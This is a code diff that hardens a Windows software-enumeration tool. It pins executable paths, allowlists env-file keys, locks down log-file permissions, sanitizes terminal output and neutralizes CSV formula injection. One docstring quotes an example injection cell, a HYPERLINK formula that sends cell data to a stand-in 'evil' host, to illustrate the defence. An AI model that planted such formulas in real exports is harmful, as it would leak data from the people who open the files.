@@ -12,16 +12,21 @@ import collections
 import concurrent.futures
 import csv
 import ctypes
+from ctypes import wintypes
+import functools
 import getpass
 import io
 import json
 import logging
 from logging.handlers import RotatingFileHandler
+import msvcrt
 import os
 import re
+import stat
 import subprocess
 import sys
 import time
+import types
 import unicodedata
 import urllib.request
 import urllib.parse
@@ -54,26 +59,83 @@ def setup_console_encoding():
             pass
 
 
-def _load_env_file() -> None:
-    """Load variables from .env files into os.environ (without overwriting existing values).
+# --- Executable resolution -----------------------------------------------
+# Never launch a program by bare name: Windows searches the current directory before
+# PATH, so a planted powershell.exe / winget.exe in the folder the tool is run from
+# would execute instead of the real one.
 
-    Searches for api.env or .env in the script's directory, then the current
-    working directory. Only sets variables that are not already in the environment,
-    so explicit env vars and CLI args always take precedence.
+def _system_dir() -> Path:
+    """Return the Windows System32 directory as reported by the OS.
+
+    Uses GetSystemDirectoryW rather than %SystemRoot%, which the parent process controls.
     """
-    search_dirs = []
-    # Script's own directory
-    script_dir = Path(__file__).resolve().parent
-    search_dirs.append(script_dir)
-    # Current working directory (if different)
-    cwd = Path.cwd()
-    if cwd != script_dir:
-        search_dirs.append(cwd)
+    size = 260
+    while True:
+        buf = ctypes.create_unicode_buffer(size)
+        length = ctypes.windll.kernel32.GetSystemDirectoryW(buf, size)
+        if length == 0:
+            raise OSError("GetSystemDirectoryW failed")
+        if length < size:
+            return Path(buf.value)
+        size = length + 1  # buffer too small; length is the size needed
 
-    env_filenames = ["api.env", ".env"]
 
-    for search_dir in search_dirs:
-        for filename in env_filenames:
+def _powershell_path() -> Path:
+    """Absolute path of Windows PowerShell 5.1 (ships with every Windows 10/11)."""
+    return _system_dir() / "WindowsPowerShell" / "v1.0" / "powershell.exe"
+
+
+def _winget_path() -> Optional[Path]:
+    """Absolute path of winget, or None if it isn't installed for this user.
+
+    winget is an app-execution alias (a 0-byte reparse point) that App Installer
+    creates in %LOCALAPPDATA%\\Microsoft\\WindowsApps; it runs fine by absolute path.
+    There is deliberately no fallback to the bare name.
+    """
+    local_app_data = os.environ.get("LOCALAPPDATA")
+    if not local_app_data:
+        return None
+    path = Path(local_app_data) / "Microsoft" / "WindowsApps" / "winget.exe"
+    return path if path.is_file() else None
+
+
+def _harden_process_environment() -> None:
+    """Defence in depth: stop Windows searching the current directory for executables,
+    for any subprocess this tool (or its children) starts. Leaves an existing value alone."""
+    os.environ.setdefault("NoDefaultCurrentDirectoryInExePath", "1")
+
+
+# Only these keys are read from env files. Anything else (e.g. HTTPS_PROXY or
+# SSL_CERT_FILE, which Python's HTTPS stack honours) is ignored, so an env file
+# can't redirect or intercept the tool's network traffic.
+_ENV_FILE_ALLOWED_KEYS = frozenset({"NVD_API_KEY"})
+_ENV_FILENAMES = ("api.env", ".env")
+
+
+def _env_search_dirs() -> list[Path]:
+    """Folders searched for api.env / .env: only the tool's own folder.
+
+    That is the folder of Software_Enumerator.py, or of the .exe for PyInstaller
+    builds (whose __file__ points into a temporary extraction folder). The current
+    working directory is deliberately not searched: anyone who can drop a file
+    where the tool is run from could otherwise configure it.
+    """
+    if _running_as_frozen_exe():
+        return [Path(sys.executable).resolve().parent]
+    return [Path(__file__).resolve().parent]
+
+
+def _load_env_file() -> None:
+    """Load NVD_API_KEY from api.env or .env in the tool's own folder.
+
+    - Only keys in _ENV_FILE_ALLOWED_KEYS are read; others are ignored and logged
+      by name (never by value) at debug level.
+    - Never overwrites a variable that is already set, so explicit env vars and
+      CLI args take precedence (CLI > env var > file).
+    - Stops after the first file found (api.env before .env).
+    """
+    for search_dir in _env_search_dirs():
+        for filename in _ENV_FILENAMES:
             env_path = search_dir / filename
             try:
                 if not env_path.is_file():
@@ -82,19 +144,361 @@ def _load_env_file() -> None:
                     for line in f:
                         line = line.strip()
                         # Skip comments and blank lines
-                        if not line or line.startswith("#"):
-                            continue
-                        if "=" not in line:
+                        if not line or line.startswith("#") or "=" not in line:
                             continue
                         key, _, value = line.partition("=")
-                        key = key.strip()
-                        value = value.strip().strip("'\"")
-                        if key and key not in os.environ:
-                            os.environ[key] = value
+                        key = key.strip().upper()  # Windows env var names are case-insensitive
+                        if key not in _ENV_FILE_ALLOWED_KEYS:
+                            if key:
+                                logger.debug(f"Ignored {key!r} in {env_path.name}: only "
+                                             f"{', '.join(sorted(_ENV_FILE_ALLOWED_KEYS))} is read from env files")
+                            continue
+                        if key not in os.environ:
+                            os.environ[key] = value.strip().strip("'\"")
                 logger.debug(f"Loaded env file: {env_path}")
                 return  # Stop after first file found
             except (OSError, UnicodeDecodeError) as e:
                 logger.debug(f"Could not read {env_path}: {e}")
+
+
+# Owner-only DACL for log files, as SDDL: "P" = protected (no entries inherited from the
+# folder); full access ("FA") for the file's owner ("OW", OWNER RIGHTS S-1-3-4) and SYSTEM ("SY").
+# The whole DACL is replaced, so pre-existing explicit entries (e.g. Everyone:Read) go too.
+_OWNER_ONLY_SDDL = "D:P(A;;FA;;;OW)(A;;FA;;;SY)"
+_SDDL_REVISION_1 = 1
+_OWNER_SECURITY_INFORMATION = 0x1
+_DACL_SECURITY_INFORMATION = 0x4
+_PROTECTED_DACL_SECURITY_INFORMATION = 0x80000000
+_SE_FILE_OBJECT = 1
+_TOKEN_QUERY = 0x0008
+_TOKEN_USER = 1
+_TOKEN_OWNER = 4
+_GENERIC_WRITE = 0x40000000
+_READ_CONTROL = 0x00020000
+_WRITE_DAC = 0x00040000
+_FILE_READ_ATTRIBUTES = 0x0080
+_LOG_FILE_ACCESS = _GENERIC_WRITE | _WRITE_DAC | _FILE_READ_ATTRIBUTES
+_PROBE_ACCESS = _READ_CONTROL | _FILE_READ_ATTRIBUTES
+# No FILE_SHARE_DELETE: while the log is open nobody can delete or rename it, or rename
+# its folder, so it can't be swapped for another file (e.g. via a directory junction).
+_FILE_SHARE_READ_WRITE = 0x3
+_CREATE_NEW = 1
+_OPEN_EXISTING = 3
+_FILE_ATTRIBUTE_NORMAL = 0x80
+_FILE_FLAG_OPEN_REPARSE_POINT = 0x00200000  # open a symlink itself instead of following it
+_FILE_PERSISTENT_ACLS = 0x00000008
+_ERROR_FILE_NOT_FOUND = 2
+_ERROR_ACCESS_DENIED = 5
+_ERROR_FILE_EXISTS = 80
+_INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
+# Owners that can already read every file on the machine, so a log they own leaks nothing new
+_ALWAYS_TRUSTED_OWNER_SIDS = frozenset({"S-1-5-18", "S-1-5-32-544"})  # SYSTEM, Administrators
+
+
+class LogFileOwnershipError(PermissionError):
+    """Refusing to write a log file another account could read: it is owned by another
+    account, is a symbolic link, or has other hard links."""
+
+
+class _SecurityAttributes(ctypes.Structure):
+    _fields_ = [("nLength", wintypes.DWORD),
+                ("lpSecurityDescriptor", ctypes.c_void_p),
+                ("bInheritHandle", wintypes.BOOL)]
+
+
+@functools.lru_cache(maxsize=None)
+def _win32() -> types.SimpleNamespace:
+    """Win32 security functions with argtypes set, on private DLL handles so the
+    shared ctypes.windll objects used elsewhere are left untouched."""
+    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    pp = ctypes.POINTER(ctypes.c_void_p)
+
+    def bind(fn, argtypes, restype):
+        fn.argtypes, fn.restype = argtypes, restype
+        return fn
+
+    return types.SimpleNamespace(
+        string_to_sd=bind(advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorW,
+                          [wintypes.LPCWSTR, wintypes.DWORD, pp, ctypes.c_void_p], wintypes.BOOL),
+        sid_to_string=bind(advapi32.ConvertSidToStringSidW,
+                           [ctypes.c_void_p, ctypes.POINTER(wintypes.LPWSTR)], wintypes.BOOL),
+        get_sd_dacl=bind(advapi32.GetSecurityDescriptorDacl,
+                         [ctypes.c_void_p, ctypes.POINTER(wintypes.BOOL), pp, ctypes.POINTER(wintypes.BOOL)],
+                         wintypes.BOOL),
+        set_security_info=bind(advapi32.SetSecurityInfo,
+                               [wintypes.HANDLE, ctypes.c_int, wintypes.DWORD, ctypes.c_void_p,
+                                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p], wintypes.DWORD),
+        get_volume_information=bind(kernel32.GetVolumeInformationByHandleW,
+                                    [wintypes.HANDLE, wintypes.LPWSTR, wintypes.DWORD,
+                                     ctypes.POINTER(wintypes.DWORD), ctypes.POINTER(wintypes.DWORD),
+                                     ctypes.POINTER(wintypes.DWORD), wintypes.LPWSTR, wintypes.DWORD],
+                                    wintypes.BOOL),
+        get_security_info=bind(advapi32.GetSecurityInfo,
+                               [wintypes.HANDLE, ctypes.c_int, wintypes.DWORD, pp, pp, pp, pp, pp],
+                               wintypes.DWORD),
+        open_process_token=bind(advapi32.OpenProcessToken,
+                                [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)],
+                                wintypes.BOOL),
+        get_token_information=bind(advapi32.GetTokenInformation,
+                                   [wintypes.HANDLE, ctypes.c_int, ctypes.c_void_p, wintypes.DWORD,
+                                    ctypes.POINTER(wintypes.DWORD)], wintypes.BOOL),
+        get_current_process=bind(kernel32.GetCurrentProcess, [], wintypes.HANDLE),
+        create_file=bind(kernel32.CreateFileW,
+                         [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p,
+                          wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE], wintypes.HANDLE),
+        close_handle=bind(kernel32.CloseHandle, [wintypes.HANDLE], wintypes.BOOL),
+        local_free=bind(kernel32.LocalFree, [ctypes.c_void_p], ctypes.c_void_p),
+    )
+
+
+def _owner_only_descriptor() -> ctypes.c_void_p:
+    """Build the owner-only security descriptor. The caller must LocalFree() it."""
+    descriptor = ctypes.c_void_p()
+    if not _win32().string_to_sd(_OWNER_ONLY_SDDL, _SDDL_REVISION_1, ctypes.byref(descriptor), None):
+        raise ctypes.WinError(ctypes.get_last_error())
+    return descriptor
+
+
+def _restrict_handle_to_owner(handle) -> None:
+    """Replace an open file's access list with owner + SYSTEM only, protected from
+    inheritance. Raises OSError on failure.
+
+    os.chmod(path, 0o600) can't do this on Windows: it only toggles the read-only flag.
+    Working on the handle (not the path) guarantees it applies to the file being written.
+    """
+    api = _win32()
+    descriptor = _owner_only_descriptor()
+    try:
+        present, defaulted, dacl = wintypes.BOOL(), wintypes.BOOL(), ctypes.c_void_p()
+        if not api.get_sd_dacl(descriptor, ctypes.byref(present), ctypes.byref(dacl), ctypes.byref(defaulted)):
+            raise ctypes.WinError(ctypes.get_last_error())
+        error = api.set_security_info(handle, _SE_FILE_OBJECT,
+                                      _DACL_SECURITY_INFORMATION | _PROTECTED_DACL_SECURITY_INFORMATION,
+                                      None, None, dacl, None)
+        if error:
+            raise ctypes.WinError(error)
+    finally:
+        api.local_free(descriptor)
+
+
+def _volume_supports_acls(handle) -> bool:
+    """True if the file's drive stores access lists (NTFS/ReFS do; FAT32/exFAT don't, and
+    silently ignore the access list requested when a file is created there)."""
+    flags = wintypes.DWORD()
+    if not _win32().get_volume_information(handle, None, 0, None, None, ctypes.byref(flags), None, 0):
+        return False  # can't tell: treat as unprotected so the user is warned
+    return bool(flags.value & _FILE_PERSISTENT_ACLS)
+
+
+def _create_file_handle(path: str, access: int, disposition: int, flags: int,
+                        descriptor=None) -> tuple:
+    """CreateFileW wrapper. Returns (handle, 0) on success, or (None, Windows error code)."""
+    attributes = None
+    if descriptor is not None:
+        security = _SecurityAttributes(ctypes.sizeof(_SecurityAttributes), descriptor, False)
+        attributes = ctypes.byref(security)
+    handle = _win32().create_file(path, access, _FILE_SHARE_READ_WRITE, attributes, disposition, flags, None)
+    if handle == _INVALID_HANDLE_VALUE:
+        return None, ctypes.get_last_error()
+    return handle, 0
+
+
+def _open_log_handle(path: str) -> tuple:
+    """Open the log file and return (handle, created). The caller writes through this
+    handle, so the file is never reopened by name.
+
+    - New file: CreateFileW(CREATE_NEW) with the owner-only access list, so it is protected
+      from the instant it exists. CREATE_NEW never opens an existing file.
+    - Existing file: CreateFileW(OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT), so a symlink
+      at the path is opened as itself (and then refused) rather than followed.
+
+    Raises LogFileOwnershipError if access is denied because another account owns the
+    file, or OSError (e.g. PermissionError) for other failures.
+    """
+    for _ in range(3):  # retry if the file appears or disappears between the two calls
+        descriptor = _owner_only_descriptor()
+        try:
+            handle, error = _create_file_handle(path, _LOG_FILE_ACCESS, _CREATE_NEW,
+                                                _FILE_ATTRIBUTE_NORMAL, descriptor)
+        finally:
+            _win32().local_free(descriptor)
+        if handle is not None:
+            return handle, True
+        if error != _ERROR_FILE_EXISTS:
+            raise ctypes.WinError(error)
+
+        handle, error = _create_file_handle(path, _LOG_FILE_ACCESS, _OPEN_EXISTING,
+                                            _FILE_FLAG_OPEN_REPARSE_POINT)
+        if handle is not None:
+            return handle, False
+        if error == _ERROR_FILE_NOT_FOUND:
+            continue
+        if error == _ERROR_ACCESS_DENIED:
+            _raise_if_owned_by_another_account(path)
+        raise ctypes.WinError(error)
+    raise OSError(f"Log file {path} kept changing while it was being opened")
+
+
+def _raise_if_owned_by_another_account(path: str) -> None:
+    """After an access-denied open: raise LogFileOwnershipError if another account owns
+    the file, so the user gets that explanation rather than a bare permission error."""
+    handle, _ = _create_file_handle(path, _PROBE_ACCESS, _OPEN_EXISTING, _FILE_FLAG_OPEN_REPARSE_POINT)
+    if handle is None:
+        return
+    try:
+        owner = _handle_owner_sid(handle)
+        trusted = _trusted_owner_sids()
+    except OSError:
+        return
+    finally:
+        _win32().close_handle(handle)
+    if owner is not None and owner not in trusted:
+        raise LogFileOwnershipError(_foreign_owner_message(path))
+
+
+def _sid_to_string(psid) -> str:
+    api = _win32()
+    text = wintypes.LPWSTR()
+    if not api.sid_to_string(psid, ctypes.byref(text)):
+        raise ctypes.WinError(ctypes.get_last_error())
+    try:
+        return text.value
+    finally:
+        api.local_free(text)
+
+
+def _current_owner_sids() -> frozenset:
+    """SIDs that own files this process creates: the token's user and its default
+    owner (the Administrators group for some elevated-admin configurations)."""
+    api = _win32()
+    token = wintypes.HANDLE()
+    if not api.open_process_token(api.get_current_process(), _TOKEN_QUERY, ctypes.byref(token)):
+        raise ctypes.WinError(ctypes.get_last_error())
+    try:
+        sids = set()
+        for info_class in (_TOKEN_USER, _TOKEN_OWNER):
+            needed = wintypes.DWORD()
+            api.get_token_information(token, info_class, None, 0, ctypes.byref(needed))
+            buffer = ctypes.create_string_buffer(needed.value)
+            if not api.get_token_information(token, info_class, buffer, needed, ctypes.byref(needed)):
+                raise ctypes.WinError(ctypes.get_last_error())
+            # TOKEN_USER and TOKEN_OWNER both begin with a pointer to the SID
+            sids.add(_sid_to_string(ctypes.cast(buffer, ctypes.POINTER(ctypes.c_void_p))[0]))
+        return frozenset(sids)
+    finally:
+        api.close_handle(token)
+
+
+def _trusted_owner_sids() -> frozenset:
+    """Owners whose log files we accept: ourselves, plus accounts that can read any file anyway."""
+    return _current_owner_sids() | _ALWAYS_TRUSTED_OWNER_SIDS
+
+
+def _foreign_owner_message(path: str) -> str:
+    return (f"Log file {path} already exists and is owned by another account, which could read "
+            f"everything written to it. Choose a different --log-file path, or delete the file "
+            f"if you trust its owner.")
+
+
+def _handle_owner_sid(handle) -> Optional[str]:
+    """Owner SID of an open file, read from its handle (so it is the file actually opened)."""
+    api = _win32()
+    owner, descriptor = ctypes.c_void_p(), ctypes.c_void_p()
+    error = api.get_security_info(handle, _SE_FILE_OBJECT,
+                                  _OWNER_SECURITY_INFORMATION, ctypes.byref(owner), None, None, None,
+                                  ctypes.byref(descriptor))
+    if error:
+        raise ctypes.WinError(error)
+    try:
+        return _sid_to_string(owner) if owner.value else None
+    finally:
+        api.local_free(descriptor)
+
+
+class _RestrictedRotatingFileHandler(RotatingFileHandler):
+    """RotatingFileHandler whose files are accessible only to the current user (and SYSTEM).
+
+    The file is opened once with CreateFileW and the stream wraps that handle; it is
+    never reopened by name, and every check below is made on that same handle. While
+    it is open, nobody can delete or rename it or its folder (no FILE_SHARE_DELETE),
+    so it can't be swapped for another file.
+
+    - A new log file is created with the owner-only access list already in place
+      (CREATE_NEW), so it is never unprotected, even briefly.
+    - An existing log file is opened without following links and refused with
+      LogFileOwnershipError if it is a symbolic link (reparse point), has other hard
+      links, or is owned by another account: that account could read what is written.
+      Otherwise its access list is replaced with the owner-only one.
+    - Rollovers go through the same path; renamed backups keep their access list.
+      If a refused file appears during a rollover, logging stops with errors rather
+      than writing to it.
+
+    If the drive doesn't store access lists (e.g. FAT32/exFAT, some network shares),
+    one warning is printed and logging continues: the audit must not stop over that.
+    """
+
+    def __init__(self, *args, **kwargs):
+        self._acl_warning_shown = False  # set before super().__init__, which calls _open()
+        super().__init__(*args, **kwargs)
+
+    def _warn_unprotected(self) -> None:
+        if not self._acl_warning_shown:
+            self._acl_warning_shown = True
+            # print, not logger: this can run inside emit() during a rollover
+            print("Warning: could not restrict log file permissions to the current user; "
+                  "the log file uses its folder's permissions.", file=sys.stderr)
+
+    def _open(self):
+        handle, created = _open_log_handle(self.baseFilename)
+        try:
+            fd = msvcrt.open_osfhandle(handle, os.O_APPEND)  # fd now owns the handle
+        except OSError:
+            _win32().close_handle(handle)
+            raise
+        try:
+            self._secure(fd, handle, created)
+        except BaseException:
+            os.close(fd)
+            raise
+        return open(fd, self.mode, encoding=self.encoding, errors=self.errors)
+
+    def _secure(self, fd: int, handle, created: bool) -> None:
+        """Checks and access list for the opened file. Raises LogFileOwnershipError if
+        another account could read it."""
+        path = self.baseFilename
+        acl_volume = _volume_supports_acls(handle)
+        if not created:
+            info = os.fstat(fd)
+            if info.st_file_attributes & stat.FILE_ATTRIBUTE_REPARSE_POINT:
+                raise LogFileOwnershipError(
+                    f"Log file {path} is a symbolic link or other reparse point; refusing to write through it.")
+            if info.st_nlink > 1:
+                raise LogFileOwnershipError(
+                    f"Log file {path} has other hard links, so it may be readable under another name. "
+                    f"Choose a different --log-file path.")
+            # Ownership is checked whenever it can be read, whatever the drive reports:
+            # the drive check only decides whether to warn and apply the access list.
+            try:
+                owner = _handle_owner_sid(handle)
+                trusted = _trusted_owner_sids()
+            except OSError:
+                if acl_volume:  # fail closed: the drive has owners, but we can't see this one
+                    raise LogFileOwnershipError(
+                        f"Could not verify who owns log file {path}; refusing to write to it.") from None
+                owner = None    # drives without access lists (FAT32/exFAT) have no owners
+            if owner is not None and owner not in trusted:
+                raise LogFileOwnershipError(_foreign_owner_message(path))
+
+        if not acl_volume:
+            self._warn_unprotected()  # e.g. FAT32/exFAT: access lists aren't stored there
+            return
+        if created:
+            return  # created owner-only, and held open since, so it can't have been swapped
+        try:
+            _restrict_handle_to_owner(handle)
+        except OSError:
+            self._warn_unprotected()
 
 
 def setup_logging(log_file: str = None, verbose: bool = False) -> None:
@@ -114,23 +518,16 @@ def setup_logging(log_file: str = None, verbose: bool = False) -> None:
     level = logging.DEBUG if verbose else logging.INFO
 
     if log_file:
-        # Ensure log file has restricted permissions on creation
         log_path = Path(log_file)
         log_path.parent.mkdir(parents=True, exist_ok=True)
 
-        # Configure rotating file handler (5 MB max, keep 3 backups)
-        file_handler = RotatingFileHandler(
+        # Rotating file handler (5 MB max, keep 3 backups); files are owner-only
+        file_handler = _RestrictedRotatingFileHandler(
             log_file, maxBytes=5*1024*1024, backupCount=3, encoding='utf-8'
         )
         file_handler.setLevel(level)
         file_handler.setFormatter(logging.Formatter(log_format, date_format))
         logger.addHandler(file_handler)
-
-        # Try to set restrictive permissions (owner read/write only)
-        try:
-            os.chmod(log_file, 0o600)
-        except (OSError, AttributeError):
-            pass  # Windows may not support chmod, or file doesn't exist yet
 
     # Always add a stderr handler for warnings/errors (but not info/debug)
     stderr_handler = logging.StreamHandler(sys.stderr)
@@ -156,23 +553,71 @@ def log_audit_event(event_type: str, details: str = "", **kwargs) -> None:
     logger.info(message)
 
 
-def sanitize_output(text: str) -> str:
-    """Remove ANSI escape sequences and control characters from text.
+# Terminal escape sequences, following the ECMA-48 grammar rather than a fixed list:
+#   CSI  = ESC[ or 8-bit 0x9B, parameter bytes 0x30-0x3F (incl. "?" as in ESC[?25l),
+#          intermediate bytes 0x20-0x2F, one final byte 0x40-0x7E
+#   OSC  = ESC] or 8-bit 0x9D ... terminated by BEL, ESC\ (ST) or 8-bit ST 0x9C
+#   other two-byte escapes (ESC c, ESC 7, ESC ( B, ...)
+_ESCAPE_SEQUENCE_RE = re.compile(
+    r'(?:\x1b\[|\x9b)[0-?]*[ -/]*[@-~]'
+    r'|(?:\x1b\]|\x9d)[^\x07\x1b\x9c]*(?:\x07|\x1b\\|\x9c)'
+    r'|\x1b[ -/]*[0-~]'
+)
 
-    Prevents malicious software from manipulating terminal output
-    or hiding its presence in listings via escape sequences.
+# Characters that break or move the line. Replaced with a space (not removed) so that
+# hidden text becomes visible, e.g. "EvilRAT\rGoogle Chrome" -> "EvilRAT Google Chrome".
+_LINE_BREAK_CHARS = frozenset("\t\n\v\f\r\x85  ")
+
+
+def sanitize_output(text: str) -> str:
+    """Make untrusted text safe to print as a single-line field.
+
+    Prevents malicious software from manipulating terminal output or hiding
+    its presence in listings:
+    - removes terminal escape sequences (7-bit and 8-bit forms)
+    - replaces line breaks, carriage returns and tabs with a space, so a name
+      can't overwrite itself on screen or inject fake table rows
+    - removes all other control characters (C0, DEL, C1) and Unicode format
+      characters (category Cf, e.g. U+202E bidi override, zero-width space)
+
+    None is returned unchanged; other non-string values are converted to str.
     """
+    if text is None:
+        return None
+    if not isinstance(text, str):
+        text = str(text)
     if not text:
         return text
-    # Remove ANSI escape sequences (colors, cursor movement, etc.)
-    text = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', text)
-    # Remove other escape sequences (OSC, etc.)
-    text = re.sub(r'\x1b\][^\x07]*\x07', '', text)
-    # Remove remaining control characters except newline and tab
-    text = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', text)
-    # Remove Unicode bidirectional overrides and other format characters (category Cf)
-    # Prevents visual spoofing of filenames (e.g., U+202E reverses displayed text)
-    text = ''.join(c for c in text if unicodedata.category(c) != 'Cf')
+    text = _ESCAPE_SEQUENCE_RE.sub('', text)
+    cleaned = []
+    for c in text:
+        if c in _LINE_BREAK_CHARS:
+            cleaned.append(' ')
+        elif unicodedata.category(c) in ('Cc', 'Cf'):
+            continue
+        else:
+            cleaned.append(c)
+    return ''.join(cleaned)
+
+
+# Leading characters that make spreadsheet apps (Excel, LibreOffice, Google Sheets) treat a
+# CSV cell as a formula (OWASP "CSV Injection"). OWASP also lists TAB and CR; sanitize_output
+# has already turned those into spaces, which is why the check ignores leading whitespace.
+_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@")
+
+
+def csv_safe_cell(value) -> str:
+    """Sanitize a value for a CSV cell and neutralise spreadsheet formula injection.
+
+    A cell such as '=HYPERLINK("http://evil/?"&A1,"Click")' would run as a formula when
+    the export is opened in Excel; quoting does not prevent this. Prefixing a single
+    quote makes spreadsheet apps show the value as literal text.
+    """
+    text = sanitize_output(value)
+    if text is None:
+        return ""
+    if text.lstrip().startswith(_CSV_FORMULA_PREFIXES):
+        return "'" + text
     return text
 
 
@@ -466,8 +911,19 @@ class RegistryScanner:
         (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
     ]
 
+    def __init__(self):
+        # Anomaly counters, reset by get_all_registry_software() and reported once per scan.
+        # Real installers store these fields as REG_SZ, so non-zero counts are worth a warning.
+        self.converted_values = 0    # text values stored with another type, converted to text
+        self.unreadable_entries = 0  # entries that could not be parsed at all and were skipped
+
     def scan_registry_key(self, hive: int, path: str) -> list[SoftwareInfo]:
-        """Scan a specific registry key for installed software."""
+        """Scan a specific registry key for installed software.
+
+        Entries are untrusted: any process can write under HKCU. Values are converted to
+        text rather than rejected, so a malformed entry is still reported instead of
+        silently disappearing (or aborting the whole scan).
+        """
         software_list = []
 
         try:
@@ -481,30 +937,31 @@ class RegistryScanner:
             subkey_count = winreg.QueryInfoKey(key)[0]
 
             for i in range(subkey_count):
+                subkey_path = f"{path}\\[{i}]"
                 try:
                     subkey_name = winreg.EnumKey(key, i)
                     subkey_path = f"{path}\\{subkey_name}"
                     subkey = winreg.OpenKey(hive, subkey_path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
 
                     try:
-                        name = self._get_registry_value(subkey, "DisplayName")
+                        name = self._get_registry_str(subkey, "DisplayName")
                         if not name:
                             continue
 
-                        # Skip system components and updates
-                        system_component = self._get_registry_value(subkey, "SystemComponent")
-                        if system_component == 1:
+                        # Skip system components (Windows' own app list hides these too)
+                        system_component = self._get_registry_str(subkey, "SystemComponent", expect_text=False)
+                        if system_component.strip() == "1":
                             continue
 
                         software = SoftwareInfo(
                             name=name,
-                            version=self._get_registry_value(subkey, "DisplayVersion") or "",
-                            publisher=self._get_registry_value(subkey, "Publisher") or "",
+                            version=self._get_registry_str(subkey, "DisplayVersion"),
+                            publisher=self._get_registry_str(subkey, "Publisher"),
                             install_date=self._format_install_date(
-                                self._get_registry_value(subkey, "InstallDate")
+                                self._get_registry_str(subkey, "InstallDate")
                             ),
                             source="Registry",
-                            install_location=self._get_registry_value(subkey, "InstallLocation") or "",
+                            install_location=self._get_registry_str(subkey, "InstallLocation"),
                         )
                         software_list.append(software)
 
@@ -512,6 +969,11 @@ class RegistryScanner:
                         winreg.CloseKey(subkey)
 
                 except (FileNotFoundError, PermissionError, OSError):
+                    continue
+                except (TypeError, ValueError, AttributeError) as e:
+                    # Backstop: one unparseable entry must not abort the rest of the scan
+                    self.unreadable_entries += 1
+                    logger.debug(f"Skipped unreadable registry entry {subkey_path}: {e}")
                     continue
 
         finally:
@@ -527,9 +989,36 @@ class RegistryScanner:
         except FileNotFoundError:
             return None
 
+    @staticmethod
+    def _registry_value_to_str(value) -> str:
+        """Convert a value returned by winreg to text, whatever registry type it had."""
+        if value is None:
+            return ""
+        if isinstance(value, str):            # REG_SZ, REG_EXPAND_SZ
+            return value
+        if isinstance(value, bytes):          # REG_BINARY, REG_NONE: REG_SZ data is UTF-16LE,
+            return value.decode("utf-16-le", errors="replace").rstrip("\x00")  # so decode it the same way
+        if isinstance(value, (list, tuple)):  # REG_MULTI_SZ
+            return " ".join(str(v) for v in value)
+        return str(value)                     # REG_DWORD, REG_QWORD
+
+    def _get_registry_str(self, key, value_name: str, expect_text: bool = True) -> str:
+        """Read a registry value as text ("" if missing).
+
+        Args:
+            expect_text: True for fields real installers store as REG_SZ. A value of any
+                other type is still converted, but counted as an anomaly.
+        """
+        value = self._get_registry_value(key, value_name)
+        if expect_text and value is not None and not isinstance(value, str):
+            self.converted_values += 1
+            logger.debug(f"Registry value {value_name} has type {type(value).__name__}; converted to text")
+        return self._registry_value_to_str(value)
+
     def _format_install_date(self, date_str: Optional[str]) -> str:
         """Format install date from YYYYMMDD to readable format."""
-        if not date_str or len(date_str) != 8:
+        date_str = self._registry_value_to_str(date_str).strip()
+        if len(date_str) != 8:
             return ""
         try:
             date = datetime.strptime(date_str, "%Y%m%d")
@@ -541,6 +1030,8 @@ class RegistryScanner:
         """Get all software from all registry locations."""
         all_software = []
         seen_names = set()
+        self.converted_values = 0
+        self.unreadable_entries = 0
 
         for hive, path in self.REGISTRY_PATHS:
             software_list = self.scan_registry_key(hive, path)
@@ -549,6 +1040,14 @@ class RegistryScanner:
                 if software.name not in seen_names:
                     seen_names.add(software.name)
                     all_software.append(software)
+
+        if self.converted_values:
+            logger.warning(
+                f"{self.converted_values} registry value(s) had an unexpected type and were "
+                f"converted to text. Real installers don't do this; the entries are still listed."
+            )
+        if self.unreadable_entries:
+            logger.warning(f"{self.unreadable_entries} registry entry(ies) could not be parsed and were skipped.")
 
         return all_software
 
@@ -565,7 +1064,7 @@ class StoreAppScanner:
             # -NoLogo: Skip the copyright banner (minor startup speedup)
             # -NoProfile: Skip loading user profile scripts
             cmd = [
-                "powershell",
+                str(_powershell_path()),  # absolute path, never a PATH/CWD lookup
                 "-NoLogo",
                 "-NoProfile",
                 "-Command",
@@ -623,7 +1122,7 @@ class StoreAppScanner:
             logger.warning("PowerShell command timed out while enumerating Store apps")
         except FileNotFoundError:
             logger.warning(
-                "PowerShell not found in PATH. Store app enumeration requires PowerShell."
+                "Windows PowerShell not found. Store app enumeration requires PowerShell."
             )
         except OSError as e:
             logger.debug(f"OS error during Store app enumeration: {e}")
@@ -889,10 +1388,15 @@ class WingetUpdateChecker:
         """Query winget for available updates."""
         updates = []
 
+        winget = _winget_path()
+        if winget is None:
+            print("Warning: winget not found. Please ensure Windows Package Manager is installed.", file=sys.stderr)
+            return updates
+
         try:
             # Run winget upgrade to get list of available updates
             cmd = [
-                "winget", "upgrade",
+                str(winget), "upgrade",  # absolute path, never a PATH/CWD lookup
                 "--include-unknown",
                 "--disable-interactivity",
                 "--accept-source-agreements"
@@ -1139,42 +1643,80 @@ class BrowserExtensionScanner:
     def _parse_chromium_manifest(
         self, manifest_path: Path, ext_id: str, browser: str
     ) -> Optional[BrowserExtensionInfo]:
-        """Parse a Chromium extension's manifest.json file."""
+        """Parse a Chromium extension's manifest.json file.
+
+        The file is untrusted: fields are type-checked and converted so a malformed
+        manifest can't crash the scan. Returns None if the file is missing, isn't valid
+        JSON, or isn't a JSON object (Chromium won't load such an extension either).
+        """
         try:
             with open(manifest_path, "r", encoding="utf-8", errors="replace") as f:
                 manifest = json.load(f)
+        except (OSError, ValueError, RecursionError):
+            # Missing file, invalid JSON, or nesting deep enough to overflow the parser
+            return None
+        if not isinstance(manifest, dict):
+            return None
 
-            name = manifest.get("name", "Unknown")
+        try:
+            name = self._as_text(manifest.get("name")) or "Unknown"
             # Handle localized names (they start with __MSG_)
